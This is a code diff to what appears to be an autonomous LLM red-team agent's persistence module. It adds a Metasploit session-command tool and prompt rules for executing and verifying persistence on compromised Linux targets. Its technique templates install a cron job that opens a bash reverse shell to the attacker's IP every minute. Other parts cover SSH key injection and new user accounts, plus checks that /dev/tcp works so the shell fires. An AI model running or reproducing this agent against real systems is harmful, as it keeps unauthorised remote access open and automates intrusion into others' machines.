@@ -35,7 +35,7 @@ from core_agents.common import (
 )
 from core_agents.state import PersistenceFindings
 from tools.rag import query_knowledge_base
-from tools.metasploit_tools import msf_session, tool_session_command
+from tools.metasploit_tools import msf_session
 
 # =============================================================================
 # CONSTANTS
@@ -86,15 +86,39 @@ def tool_linux_terminal(command: str):
 
 
 @tool
+def tool_session_command(session_id: str, command: str):
+    """Execute a command ON THE TARGET through an active Metasploit session.
+
+    This runs directly on the compromised target machine — NOT on Kali.
+    Uses the MSF session API (session.shell_write/read) for reliable, atomic command execution.
+
+    Use for: whoami, id, crontab -l, cat /etc/passwd, mkdir, echo, chmod, etc.
+
+    Persistence-stage commands (useradd, crontab pipes, etc.) can be slow to
+    flush on a raw command_shell, so this wrapper uses a longer 30s read window
+    than the default 10s to avoid mistaking slow output for an unresponsive shell.
+
+    Args:
+        session_id: The MSF session ID (e.g., "3")
+        command: The command to run on the target
+    """
+    return msf_session.run_session_command(session_id, command, timeout=30)
+
+
+@tool
 def tool_metasploit_rpc(command: str):
     """
     Execute a command on the Metasploit CONSOLE.
     Use ONLY for MSF console commands: listing sessions, background, use, set, run, exploit.
 
     Do NOT use this for running commands on the target — use tool_session_command instead.
+
+    NOTE: this call has a 45-second wall-clock timeout. Meterpreter post modules
+    (run persistence, use post/..., run) MAY block the console until the module
+    completes or times out — do NOT chain multiple blocking run commands.
     """
     try:
-        return msf_session.send_command(command)
+        return msf_session.send_command(command, timeout=45)
     except Exception as e:
         return f"RPC Error: {str(e)}"
 
@@ -162,6 +186,11 @@ VERIFICATION_PLAN:
 - Read the critic's feedback carefully
 - Choose a DIFFERENT technique from the recommended list
 - Do NOT repeat a technique that already failed
+- Each PREVIOUS ATTEMPTS entry identifies the FAILED_TECHNIQUE that was tried.
+  You MUST choose a different technique from the recommended list for this retry.
+  Do NOT select the same technique as any FAILED_TECHNIQUE line above, even with
+  different parameters (e.g. if cron_job failed, switch to SSH key injection or a
+  new user account — do not just tweak the cron command).
 """
 
 EXECUTOR_PROMPT = f"""You are a Persistence Executor for a Red Team agent. Your attacker IP is {KALI_IP}.
@@ -184,12 +213,16 @@ If no active session exists at all, STOP making tool calls and state clearly in 
 the session was dead — do NOT attempt any further persistence commands. Do NOT retry the original
 session_id after seeing the not-found error (retrying only burns your tool budget).
 
+**UNRESPONSIVE SHELL DETECTION:** Some commands ALWAYS produce output when the shell is functional: `whoami`, `id`, `crontab -l`, `cat <file>`. If `tool_session_command` returns `(no output)` for any such diagnostic command, the shell is frozen or not accepting input — treat this as an unresponsive session. This is a DIFFERENT failure mode from "Error: Session X not found". Immediately call `tool_metasploit_rpc('sessions')` to confirm the session is still listed. If it is, try ONE recovery: call `tool_session_command` with a simple newline or `echo test`. If still `(no output)`, STOP making tool calls and state clearly: 'Session unresponsive — no output from diagnostic command. Cannot confirm persistence was installed.' Do NOT claim success from silent output on a diagnostic command — `(no output)` is NOT evidence of success.
+
 - **NEVER use `sudo` through a session** — if you have root access, you already ARE root. If you don't, sudo won't work (no TTY).
 
 **SESSION TYPE AWARENESS:**
 - **command_shell**: Raw shell. Use standard Linux commands only. No `upload`, no `run`, no post modules.
 - **meterpreter**: Full MSF post-exploitation. Can use `upload`, `run persistence`, post modules, etc.
 - Match your commands to the session type. Do NOT try meterpreter commands on a command_shell.
+
+**MSF CONSOLE TIMEOUT:** tool_metasploit_rpc has a 45-second wall-clock timeout. For meterpreter post modules (run persistence, use post/..., run), the MSF console MAY block until the module completes or times out — do NOT chain multiple blocking run commands back-to-back. After calling run on a post module, wait for the tool output before calling the next command. If the output says the module is still running or is empty, do not call run again; move on and let the verifier confirm the result.
 
 **Your job:** Execute the persistence installation plan step by step.
 
@@ -251,6 +284,8 @@ If an active session to the target exists, switch to its ID for the remaining ve
 If no active session exists at all, STOP making tool calls and report STATUS: NOT WORKING with
 EVIDENCE noting the session was dead — do NOT retry the original session_id.
 
+**UNRESPONSIVE SHELL DETECTION:** Some commands ALWAYS produce output when the shell is functional: `whoami`, `id`, `crontab -l`, `cat <file>`. If `tool_session_command` returns `(no output)` for any such diagnostic command, the shell is frozen or not accepting input — treat this as an unresponsive session (DIFFERENT from "Session X not found"). Immediately call `tool_metasploit_rpc('sessions')` to confirm the session is still listed. If it is, try ONE recovery: call `tool_session_command` with `echo test`. If still `(no output)`, STOP making tool calls and report STATUS: NOT WORKING with EVIDENCE noting the session was unresponsive. Do NOT report STATUS: WORKING when a diagnostic command returned `(no output)` — silent output is NOT proof the mechanism works.
+
 **Verification strategies by technique:**
 
 SSH Key:
@@ -267,12 +302,16 @@ Cron Job:
      Expected: cron daemon is running/active.
   3. ON TARGET: `tool_session_command("<session_id>", "which bash")`
      Expected: the shell binary referenced by the entry exists (e.g. /bin/bash).
-  4. ON TARGET: `tool_session_command("<session_id>", "ls -la /dev/tcp 2>/dev/null || echo no_dev_tcp")`
-     Expected: /dev/tcp exists (bash pseudo-device). If the output is
-     `no_dev_tcp`, the `/dev/tcp` redirection the reverse shell relies on is
-     unavailable on this target — the cron job is listed but the reverse shell
-     will NOT fire. In that case set STATUS to PARTIAL (not WORKING) and note
-     it in EVIDENCE so the critic knows a file-write heartbeat fallback is needed.
+  4. ON TARGET: `tool_session_command("<session_id>", "bash -c 'echo x >/dev/tcp/127.0.0.1/22' 2>/dev/null && echo dev_tcp_ok || echo no_dev_tcp")`
+     Expected: `dev_tcp_ok` (bash can open /dev/tcp). Do NOT use `ls -la /dev/tcp`
+     — /dev/tcp is a bash pseudo-device with no filesystem directory entry, so
+     `ls` reports "No such file or directory" even when the redirection works
+     perfectly, producing a false PARTIAL. The bash test above actually exercises
+     the pseudo-device. If the output is `no_dev_tcp`, the `/dev/tcp` redirection
+     the reverse shell relies on is unavailable on this target — the cron job is
+     listed but the reverse shell will NOT fire. In that case set STATUS to
+     PARTIAL (not WORKING) and note it in EVIDENCE so the critic knows a
+     file-write heartbeat fallback is needed.
 - If the cron entry is a reverse shell, you cannot directly confirm it fires
   without a listener on Kali. Treat it as WORKING only when all FOUR checks
   above pass: entry listed AND cron daemon active AND shell binary present AND
@@ -432,7 +471,7 @@ def _get_recommended_techniques(access_level: str, session_type: str, session_id
                 f'tool_session_command({session_id}, "echo \\"* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1\'\\" | crontab -")',
                 f'tool_session_command({session_id}, "crontab -l")  # verify on TARGET',
             ],
-            "verification": "tool_session_command: crontab -l shows the reverse shell entry; ls -la /dev/tcp confirms the reverse shell can fire",
+            "verification": "tool_session_command: crontab -l shows the reverse shell entry; bash -c 'echo x >/dev/tcp/127.0.0.1/22' (echoes dev_tcp_ok) confirms the reverse shell can fire. Do NOT use 'ls -la /dev/tcp' — it always fails on Linux even when /dev/tcp works.",
             "notes": ("Most reliable. Works on all Linux. Fires every minute. The entry "
                       "explicitly invokes /bin/bash so /dev/tcp works even if cron uses /bin/sh. "
                       "If /dev/tcp is unavailable (some hardened kernels/distros), the reverse "
@@ -480,7 +519,7 @@ def _get_recommended_techniques(access_level: str, session_type: str, session_id
                 f'tool_session_command({session_id}, "echo \\"* * * * * /bin/bash -c \'bash -i >& /dev/tcp/{KALI_IP}/4444 0>&1\'\\" | crontab -")',
                 f'tool_session_command({session_id}, "crontab -l")  # verify on TARGET',
             ],
-            "verification": "tool_session_command: crontab -l shows the reverse shell entry; ls -la /dev/tcp confirms the reverse shell can fire",
+            "verification": "tool_session_command: crontab -l shows the reverse shell entry; bash -c 'echo x >/dev/tcp/127.0.0.1/22' (echoes dev_tcp_ok) confirms the reverse shell can fire. Do NOT use 'ls -la /dev/tcp' — it always fails on Linux even when /dev/tcp works.",
             "notes": ("Works without root. User-level cron. The entry explicitly invokes "
                       "/bin/bash so /dev/tcp works even if cron uses /bin/sh. If /dev/tcp is "
                       "unavailable, the reverse shell will NOT fire — fall back to a file-write "
@@ -799,6 +838,15 @@ def critic_node(state: PersistenceState) -> dict:
     install_result = state.get("install_result", "")
     verification_result = state.get("verification_result", "")
 
+    # Extract the technique name that was attempted so FAIL feedback can name it
+    # explicitly. The planner's failed_attempts scan reads CRITIC FEEDBACK
+    # HumanMessages, so embedding a structured FAILED_TECHNIQUE line lets the
+    # planner reliably avoid re-selecting the same approach on retry.
+    failed_technique = "unknown"
+    m = re.search(r"TECHNIQUE:\s*([^\n]+)", persistence_plan or "", re.IGNORECASE)
+    if m:
+        failed_technique = m.group(1).strip()
+
     # HARD GUARD: never let the critic LLM emit PASS on absent verification.
     # If the verifier produced no text-only assessment (hit its tool cap with
     # empty content, or the loop exited before it ran), verification_result is
@@ -813,6 +861,7 @@ def critic_node(state: PersistenceState) -> dict:
         return {
             "messages": [HumanMessage(content=(
                 "CRITIC FEEDBACK: VERDICT: FAIL\n"
+                f"FAILED_TECHNIQUE: {failed_technique}\n"
                 "METHOD: unknown\n"
                 "ASSESSMENT: Verification was not performed — no output captured.\n"
                 "FEEDBACK: Re-run the verifier and confirm the mechanism actually "
@@ -860,7 +909,9 @@ def critic_node(state: PersistenceState) -> dict:
         }
     else:
         return {
-            "messages": [HumanMessage(content=f"CRITIC FEEDBACK: {verdict_text}")],
+            "messages": [HumanMessage(content=(
+                f"CRITIC FEEDBACK: FAILED_TECHNIQUE: {failed_technique}\n{verdict_text}"
+            ))],
             "loop_step": new_step,
             "critic_verdict": "FAIL",
         }
